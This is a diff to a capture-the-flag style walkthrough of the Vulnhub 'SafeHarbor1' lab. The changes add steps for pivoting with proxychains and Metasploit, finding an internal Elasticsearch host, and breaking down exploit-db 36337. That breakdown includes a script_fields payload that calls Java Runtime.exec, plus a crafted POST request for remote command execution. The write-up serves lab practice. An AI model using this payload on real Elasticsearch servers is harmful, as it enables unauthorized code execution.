@@ -391,10 +391,15 @@ Quickly testing the socks5 proxy connectivity, let's do a curl on the target web
 
 ![reverse_shell_gif](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.gif)
 
-Let's go ahead and run a full TCP port scan on using Metasploit with proxychains:
+Let's go ahead and run a full TCP port scan on using Metasploit with proxychains. To do this launch msfconsole using the below command and use the "auxiliary/portscan/tcp" module.
+
+```
+proxychains msfconsole
+```
 
 ![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_8.png)
 
+Let's list the services to see what we have:
 
 ```
 Services
@@ -412,9 +417,29 @@ host          port  proto  name  state  info
 172.20.0.138  3306  tcp          open  
 ```
 
+This host has Kibana running on it and possibly is looking for ElasticSearch?
+
 ![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_9.png)
 
-https://www.exploit-db.com/exploits/36337
+A quick google search reveals that ElasticSearch will use 9200 for requests and port 9300 for communication between nodes within the cluster. Otherwise, port 9201 and 9301 are used.
+
+After running a portscan on these specific ports, I found that the below host is running Elastic Search.
+
+```
+host          port  proto  name  state  info
+----          ----  -----  ----  -----  ----
+172.20.0.124  9200  tcp          open
+```
+
+Searching on exploit-db, I found this python exploit: https://www.exploit-db.com/exploits/36337
+
+Let's break it down to see where the command injection is:
+
+```
+payload = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" %(command)
+```
+
+So it looks like, my POST request should be crafted like below to execute commands on the target server.
 
 ```
 POST http://172.20.0.124:9200/_search?pretty HTTP/1.1
@@ -435,7 +460,7 @@ Alright, now that I know how the command injection works I'll go ahead and use t
 
 ![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_10.png)
 
-Gathered some info:
+Using some post modules in Metasploit, perform recon on the host.
 
 ![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_11.png)
 
